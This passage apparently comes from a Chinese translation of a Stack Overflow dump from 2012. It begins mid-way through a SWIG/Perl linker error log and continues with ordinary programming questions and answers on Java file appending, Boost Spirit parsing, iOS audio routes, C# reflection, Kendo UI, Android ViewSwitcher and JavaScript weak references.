C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1706: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1706: undefined reference to `Perl_newSViv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1709: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1709: undefined reference to `Perl_sv_2mortal'
interface_wrap.o: In function `swig_magic_readonly':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1732: undefined reference to `Perl_croak_nocontext'
interface_wrap.o: In function `wrap_new_Foo':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_Imarkstack_ptr_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1752: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1755: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1755: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1755: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1757: undefined reference to `Foo::Foo()'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1758: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1758: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1759: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1759: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1759: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1759: undefined reference to `Perl_Istack_base_ptr'
interface_wrap.o: In function `wrap_delete_Foo':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_Imarkstack_ptr_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1772: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1775: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1775: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1775: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1777: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1777: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1779: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1779: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1779: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1782: undefined reference to `Foo::~Foo()'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1783: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1783: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1783: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1783: undefined reference to `Perl_sv_newmortal'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1785: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1785: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1785: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1785: undefined reference to `Perl_Istack_base_ptr'
interface_wrap.o: In function `wrap_Foo_bar':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_Imarkstack_ptr_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1803: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1806: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1806: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1806: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1808: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1808: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1810: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1810: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1810: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1813: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1813: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1815: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1815: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1815: undefined reference to `Perl_sv_setpvf_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1818: undefined reference to `Foo::bar(int)'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1819: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1819: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1822: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1822: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1822: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1822: undefined reference to `Perl_Istack_base_ptr'
interface_wrap.o: In function `boot_example':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_Imarkstack_ptr_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2111: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2120: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2120: undefined reference to `Perl_newXS'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2129: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2129: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2133: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2133: undefined reference to `Perl_sv_setiv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2141: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2141: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2144: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2144: undefined reference to `Perl_sv_setiv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2147: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2147: undefined reference to `Perl_sv_setnv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2150: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2150: undefined reference to `Perl_sv_setpv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2165: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2165: undefined reference to `Perl_Istack_base_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2165: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2165: undefined reference to `Perl_Isv_yes_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2166: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2166: undefined reference to `Perl_Istack_sp_ptr'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2166: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:2166: undefined reference to `Perl_Istack_base_ptr'
collect2: ld gab 1 als Ende-Status zurück

12:49:52 Build Finished (took 1s.224ms) 
```

代码如下所示：

```
/*
 * example.cpp
 *
 *  Created on: 13.11.2012
 *      Author: sesc3661
 */
#include "example.h"

class FooProxy {
private:
      int   x;
public:
      FooProxy() {
      }
     ~FooProxy() {
      }
      int bar(int x) {
            return x;
      }
      int x_get() {
            return this->x;
      }
      void x_set(int x) {
            this->x = x;
      }
}; 
```

这是头文件：

```
class Foo {
public:
      Foo();
     ~Foo();
      int  bar(int x);
}; 
```

这是接口文件：

```
/* example.i */
%module example
%{
 /* Lazzy example, add header in the .i and not much work needed from now on */
#include "example.h"
%}

%include "example.h" 
```

我的目标是将 C++ - 代码包装为 Perl 可执行代码。因此，我需要 SWIG 作为包装器来创建 .dll 和 Perl 代码之间的接口。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T13:31:38.747

我犯了一个错误：这是错误的（64 位）Perl 版本，我必须将生成的 .dll 文件重命名为 example.dll。

# php - 为什么 Eclipse PDT 语法检查器不在未定义函数下划线？缺少 PDT 中的即时代码分析？

> ID：13360769
> 
> 赞同：0
> 
> 时间：2012-11-13T12:27:57.387
> 
> 标签：php, eclipse, code-analysis, eclipse-pdt, on-the-fly

我正在使用 Juno - 创建了一个 PHP 项目并具有 PHP 视角。

```
<?php
undefined_function();
?> 
```

当我运行这段代码时，我得到了这个：调用未定义的函数：undefined_function()

但是，eclipse PDT 语法检查器没有在未定义函数下划线。

有什么建议么？

# java - 在不丢失信息的情况下更新文本文件

> ID：13360777
> 
> 赞同：0
> 
> 时间：2012-11-13T12:28:19.203
> 
> 标签：java, file, class, text, bufferedwriter

这部分代码替换文件中的信息，如何保存信息并每次更新呢？我的意思是我想在文本文件中有答案的历史。

```
try {
    File file = new File("src/test/History.txt");

    if (!file.exists()) {
        file.createNewFile();
    }

    FileWriter fw = new FileWriter(file.getAbsoluteFile());
    BufferedWriter bw = new BufferedWriter(fw);
    bw.write("bla bla bla");
    bw.close();

} catch (IOException e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:30:53.073

如果要附加到之前写入的文件，请使用：

```
FileWriter(String fileName, boolean append) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:33:01.173

您想以附加模式打开文件。为此，您必须在 FileWriter 构造函数中添加一个布尔值。

```
FileWriter fw = new FileWriter(file.getAbsoluteFile(), true); 
```

有关更多信息，请参阅[FileWriter 文档](http://docs.oracle.com/javase/6/docs/api/java/io/FileWriter.html)。

# c++ - Boost Spirit QI 语法缓慢，用于解析分隔字符串

> ID：13360783
> 
> 赞同：0
> 
> 时间：2012-11-13T12:28:35.110
> 
> 标签：c++, boost, boost-spirit

> **可能的重复：**
> [提升精神 QI 缓慢](https://stackoverflow.com/questions/13343874/boost-spirit-qi-slow)

我目前正在尝试使用 Boost Spirit QI 进行 CSV 数据解析。

我正在使用 1GB CSV 文件运行我的测试。每行看起来像

```
123|123|\n 
```

该文件大约有60Mio。行。

我稍后想为我知道列的数据类型的任意 CSV 文件生成解析器。所以我首先做了一个测试，使用语法将行解析为整数行（由两个整数组成的结构的向量）：

```
csv = *(int_ >> lit('|') >> int_ >> lit('|')); 
```

在大约 2 秒内解析文件并填充向量。对于我的基准测试，我首先将 CSV 文件加载到内存中的 std::string 中（因此从磁盘加载文件不会影响性能）。

现在我尝试了相同的方法，但使用以下语法将第一列解释为字符串列（解析为由 std::string 和 int 组成的结构的向量）：

```
csv = *(lexeme[*~char_('|')] >> lit('|') >> int_ >> lit('|')); 
```

解析现在需要 12 秒，并且内存消耗正在飙升。我确保我没有交换（swapoff） - 所以这不是瓶颈。我想知道为什么 Spirit QI 中分隔字符串的解析效率如此之低。我的意思是强制转换应该比`memcpy`解析字符串更昂贵。有没有更好的办法？

**更新：**分隔字符串显然似乎是性能瓶颈。将行解释为 double 和 int 以及语法`csv = *(double_ >> lit('|') >> int_ >> lit('|'));`也会在 2 秒内解析文件。

**更新 2（代码）：**

```
namespace test
{
    namespace qi = boost::spirit::qi;
    namespace ascii = boost::spirit::ascii;

    struct row
    {
        std::string a;
        int b;
    };
}

BOOST_FUSION_ADAPT_STRUCT(
    test::row,
    (std::string, a)
    (int, b)
)

namespace test
{
    template <typename Iterator>
    struct row_parser : qi::grammar<Iterator, std::vector<row>(), ascii::space_type>
    {
        row_parser() : row_parser::base_type(start)
        {
            using qi::int_;
            using qi::lit;
            using qi::double_;
            using qi::lexeme;
            using ascii::char_;

            start = *(lexeme[*~char_('|')] >> lit('|') >> int_ >> lit('|'));
        }

        qi::rule<Iterator, std::vector<row>(), ascii::space_type> start;
    };
}

using boost::spirit::ascii::space;
typedef std::string::const_iterator iterator_type;
typedef test::row_parser<iterator_type> row_parser;

std::vector<test::row> v;

row_parser g;
std::string str;

string dataString(buffer, fileSize); // buffer contains the CSV file contents, fileSize is its size

auto startBoostParseTime = chrono::high_resolution_clock::now();

string::const_iterator iter = dataString.begin();
string::const_iterator end = dataString.end();

phrase_parse(iter, end, g, space, v);

auto endBoostParseTime = chrono::high_resolution_clock::now();

auto boostParseTime = endBoostParseTime - startBoosParseTime ;
cout << "Boost Parsing time: " << boostParseTime.count()<< " result size "<< v.size() <<endl; 
```

# ios - 在 iOS 中的内置麦克风和耳机之间进行选择

> ID：13360784
> 
> 赞同：5
> 
> 时间：2012-11-13T12:28:36.920
> 
> 标签：ios, audio, routes, microphone, remoteio

我们正在开发一个需要在 iOS 中更改音频路由的应用程序。我们需要从麦克风输入中获取一些信息，然后切换到设备的内部麦克风来录制环境声音。

我们从这些页面中看到了 2 个主题：[强制 iPhone 麦克风作为音频输入](https://stackoverflow.com/questions/4002133/forcing-iphone-microphone-as-audio-input/13347637#13347637)和[如果插入耳机则使用内置麦克风，](https://stackoverflow.com/questions/9029442/use-built-in-mic-if-headset-is-plugged-in)但我想根据这种情况没有任何最终决定。

现在，代码可以工作了，但我们可以选择音频输入的路径。

我们在 Apple (Remote IO) 提供的文档中没有找到任何内容。

这有什么新的吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-22T21:02:16.547

**警告**：此答案仅适用于 iOS6。对于 iOS7 或更高版本不正确。详情见评论。

这是可能的，但只有副作用。更改输入设备也会更改输出设备。您将无法通过内置麦克风进行录音，同时通过耳机的耳机实时收听您的录音。这意味着，如果您不想通过耳机同时收听录音，可以使用以下解决方案：

连接耳机后（= 耳机和麦克风组合），您可以在两种选择之间进行选择：

*   用于输入的内部麦克风和用于输出的扬声器
*   耳机麦克风用于输入，耳机耳机用于输出

（你不能混合使用这些。）

您可以通过音频会话服务 API 的[AudioSessionSetProperty](http://developer.apple.com/library/ios/#documentation/AudioToolbox/Reference/AudioSessionServicesReference/Reference/reference.html#//apple_ref/c/func/AudioSessionSetProperty)函数设置属性[kAudioSessionProperty_OverrideAudioRoute](http://developer.apple.com/library/ios/#documentation/AudioToolbox/Reference/AudioSessionServicesReference/Reference/reference.html#//apple_ref/c/econst/kAudioSessionProperty_OverrideAudioRoute)来选择其中一种。该物业的文件说：

> 如果在您将此属性的值设置为 时插入耳机`kAudioSessionOverrideAudioRoute_Speaker`，系统会更改输入和输出的音频路由：输入来自内置麦克风；输出到内置扬声器。

# c# - c#第三方参考更新原因问题

> ID：13360793
> 
> 赞同：1
> 
> 时间：2012-11-13T12:29:05.813
> 
> 标签：c#, reference

我想知道你是否愿意帮忙。

我有一个用 c# 编写的应用程序，它使用 IBM (cwbx) 的引用。

最初使用 v5 我调用了该函数；

```
var download = new DatabaseDownloadRequest
                   {
                     system = host,
                     UseCompression = true
                     };

  download.AS400File.Name = tableNames;
  tempFileName = Path.GetTempFileName();
  fileDescriptionFile = Path.GetTempFileName();

  download.PCFile.Name = tempFileName;
  download.PCFile.FileType = delimiterType; 
```

但是，IBM 在他们的智慧中将函数 .PCFile 更改为 .pcFile，导致我的应用程序崩溃。

如果我公司内的所有用户都使用最新版本，这不会是一个问题，但是对此的吸收速度会很慢，所以我需要能够同时使用这两个版本。

是否有任何类型的函数可以使我需要使用的函数大写或小写以使其相同，或者您能想到其他任何方法吗？

谢谢，

戴夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:30:58.387

我建议将这些调用包装到您创建的类中，该类使用反射访问它们。我无法想象任何其他方法会导致任何稳定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:48:17.530

我认为使用反射是您最好的解决方案。

像这样的东西应该适用于任何一个版本的库：

```
PropertyInfo pcFileProperty = download.GetType().GetProperty("PCFile");

if (pcFileProperty == null)
{
    pcFileProperty = download.GetType().GetProperty("pcFile");
}

if (pcFileProperty != null)
{
    PCFileType file = (PCFileType)pcFileProperty.GetValue(download, null);
    file.Name = tempFileName;
    file.FileType = delimiterType;
}
else
{
    // Property not found - IBM has changed the API again?
    // Throw an exception?
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:56:44.513

这可能是一种迂回的方式，但我已经用一些虚拟类尝试了以下方法，它似乎有效：

*   创建两个包装器项目，一个针对每个版本的 DLL 构建。
*   在您的主项目中，尝试通过相应的包装器项目调用新版本的方法。如果它有效，那就太好了。如果没有，您将收到“找不到方法：DatabaseDownloadRequest.get_pcFile”行的 MissingMethodException。捕获此异常并改用其他类！

如果设置正确，您可以使您的核心项目根本不必引用 IBM 程序集，并且您将能够仅在应用程序启动时检查*一次*异常，然后让一切正常运行。

为了澄清，我有五个项目：

1.  提供我需要的接口的集合。
2.  接口实现的集合 - 引用“新”DLL 和 (1)。
3.  另一个接口实现集合 - 引用“旧”DLL 和 (1.)。
4.  一个工厂，它检查“新”实现中的异常，然后根据检查是否通过仅返回“新”或“旧”实现 - 参考 (1)、(2) 和 (3)。
5.  使用工厂的控制台应用程序 - 仅引用 (1) 和 (4)，不引用 (2) 或 (3)，更不用说“旧”或“新”DLL。

构建解决方案后，我可以将“旧”或“新”DLL 拖放到我的输出文件夹中，并且我的控制台应用程序将在我下次运行它时做出相应的响应。

# treeview - Kendo UI Treeview 添加/删除节点

> ID：13360794
> 
> 赞同：1
> 
> 时间：2012-11-13T12:29:09.120
> 
> 标签：treeview, append, kendo-ui, removechild

我有一个带有外部 json 文件的 Kendo UI Treeview 作为 html 页面上的分层数据源。

我想从树视图中添加和删除节点，我按照剑道页面上的演示进行操作，但我得到了一个

`TypeError: c.replace is not a function`在`jquery.min.js:2`Web 控制台上打开以进行删除

和一个

`HierarchyRequestError: Node cannot be inserted at the specified point in the hierarchy`在`jquery.min.js:2`Web 控制台上为追加..

我的代码是：

```
$(document).ready(function() {
            $.getJSON("OnTheSpotDATA/" + parent.accountID + "/" + parent.username + "/" + "tree.json", function (data) {
                var treeview = $("#treeview").kendoTreeView({
                    dragAndDrop: true,
                    dataSource: kendo.observableHierarchy(data)
                });
                $(".k-treeview").data("kendoTreeView").bind("dragstart", function(e) {
                    if (e.sourceNode.childNodes.length > 1) {
                        e.preventDefault();
                    }
                });
                $("#removeNode").click(function() {
                    var selectedNode = treeview.select();

                    treeview.remove(selectedNode);
                });
                $("#appendNodeToSelected").click(function() {
                    var selectedNode = treeview.select();

                    if (selectedNode.length == 0) {
                        selectedNode = null;
                    }

                    var nodeText=prompt("Please enter desired Node name","Default");

                    if (nodeText == null) {
                        return;
                    }

                    treeview.append({
                        text: nodeText
                    }, selectedNode);
                });
            }) 
```

我究竟做错了什么？有什么办法可以解决这个问题吗？我想它应该可以正常工作..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T22:02:55.047

你忘了包括`data("kendoTreeView")`在`treeview.select()`它应该是：`treeview.data("kendoTreeView").select()`

还有一个减少代码（样式）的问题。我更喜欢定义已经包括`data("kendoTreeView")`事件的树视图。就像是：

```
var treeview = $("#treeview").kendoTreeView({
    dragAndDrop:true,
    dataSource :kendo.observableHierarchy(data),
    dragstart  :function (e) {
        if (e.sourceNode.childNodes.length > 1) {
            e.preventDefault();
        }
    }
}).data("kendoTreeView"); 
```

# android - 弹出窗口中的 ViewSwitcher

> ID：13360796
> 
> 赞同：2
> 
> 时间：2012-11-13T12:29:12.453
> 
> 标签：android, popupwindow, viewswitcher

我正在尝试在自定义 PopupWindow 中添加 ViewSwitcher，执行 showNext() 方法时出现问题它什么也没发生，显示的是相同的第一个视图。

这是xml布局：

```
<?xml version="1.0" encoding="utf-8"?>
<ViewSwitcher xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/lyt_popup_arm"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:padding="@dimen/popup_padding">

    <RelativeLayout
        android:id="@+id/lyt_progress"
        android:layout_width="match_parent"
        android:layout_height="match_parent">

        <ImageView
            android:id="@+id/spinner"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_centerVertical="true"
            android:contentDescription="@string/popup_icon_contentdesc"
            android:layout_marginLeft="@dimen/popup_spinner_left_padding"
            android:layout_marginRight="@dimen/popup_spinner_right_padding"/>

        <TextView
            android:id="@+id/text"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_centerVertical="true"
            android:layout_toRightOf="@+id/spinner"
            android:textColor="#FFFFFF"
            android:textSize="@dimen/popup_text_size" />

    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/lyt_result" 
        android:layout_width="match_parent"
        android:layout_height="match_parent">

        <ImageView
            android:id="@+id/icon"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_centerVertical="true"
            android:src="@drawable/menu_annex"
            android:contentDescription="@string/popup_icon_contentdesc" />

        <Button
            android:id="@+id/btn"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentRight="true"
            android:layout_centerVertical="true" />

        <TextView
            android:id="@+id/message"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_centerVertical="true"
            android:layout_toRightOf="@+id/icon" />

    </RelativeLayout>

</ViewSwitcher> 
```

Java代码如下：

```
public class PopupProgressArm extends PopupProgress {
    protected ViewSwitcher vSwitcher;
    protected View v1;
    protected View v2;

    public PopupProgressArm(Context context) {
        super(context);
    }

    public PopupProgressArm(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    @Override
    protected void init() {
        baseView = LayoutInflater.from(context).inflate(R.layout.popup_arm, null);
        setContentView(baseView);
        initElements();
        vSwitcher = (ViewSwitcher) baseView.getRootView();
        v1 = vSwitcher.findViewById(R.id.lyt_progress);
        v1.setTag("V1");
        v2 = vSwitcher.findViewById(R.id.lyt_result);
        v2.setTag("V2");
    }

    public void setResult(String message, int icon) {
        Log.d("CheckerService", (String) vSwitcher.getCurrentView().getTag());
        Log.d("CheckerService", "" + !((String) vSwitcher.getCurrentView().getTag()).equals((String) v2.getTag()));

        if (!((String) vSwitcher.getCurrentView().getTag()).equals((String) v2.getTag())) {
            Log.d("CheckerService", "Setting the result");
            Button btn = (Button) v2.findViewById(R.id.btn);
            TextView txtMessage = (TextView) v2.findViewById(R.id.message);
            ImageView image = (ImageView) v2.findViewById(R.id.icon);

            txtMessage.setText(message); 
            image.setImageResource(icon);
            btn.setText(context.getResources().getString(R.string.accept));
            btn.setOnClickListener(new OnClickListener() {
                @Override
                public void onClick(View v) {
                    PopupProgressArm.this.dismiss();
                }
            });
            vSwitcher.showNext();
        }
    }
} 
```

在代码中添加的记录器在logcat控制台中绘制然后执行是正确的。

如果有人知道解决方案很高兴知道它。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T18:53:18.407

好吧，经过长时间的研究，我终于找到了问题所在。

它与问题中提到的代码无关，真正的问题是当我试图从 ScheduledExecutorService 对象内的新 Runnable() 调用 ViewSwitcher 的 showNext() 方法时，因此代码从未被执行.

所以这里的教训是我们想要运行 UI 线程的所有代码都不能在同一个线程之外执行。

希望这可以帮助！

问候！

# javascript - 在 javascript 中不使对象保持活动状态的引用列表

> ID：13360804
> 
> 赞同：2
> 
> 时间：2012-11-13T12:29:52.773
> 
> 标签：javascript

这个问题与这个问题类似[，](https://stackoverflow.com/questions/5119123/weak-reference-in-firefox-javascript-chrome-code)除了我不想在 chrome 代码中这样做。

在 javascript（在浏览器中运行）中，我想跟踪使用特定构造创建的所有对象。很简单，我可以这样做：

```
var listObjects = [];

function Object() {
  listObjects.push(this);
}

Object.prototype = {
  // class members
}; 
```

这很好，除了对象即使不再使用也会保留（垃圾收集器保留它们，因为在 listObjects 中仍然有一个引用）造成内存泄漏。现在，我可以添加一个“removeObject”函数从列表中删除一个对象，但这需要用户在对象超出范围时手动调用。现在这可以解决，如果

1.  会有弱引用
2.  可以找出一个对象有多少引用
3.  可以定义一个自动调用的析构函数

不幸的是，根据我的研究，这些都不存在于 javascript 中（至少在它应该在浏览器中运行时不存在）。

谁能想到另一种在javascript中工作的方法，或者我错过的一些可以用来做到这一点的javascript功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:39:18.523

我不认为 JavaScript 对此有任何语言支持，也不认为对弱引用有任何支持，至少在浏览器环境中没有。

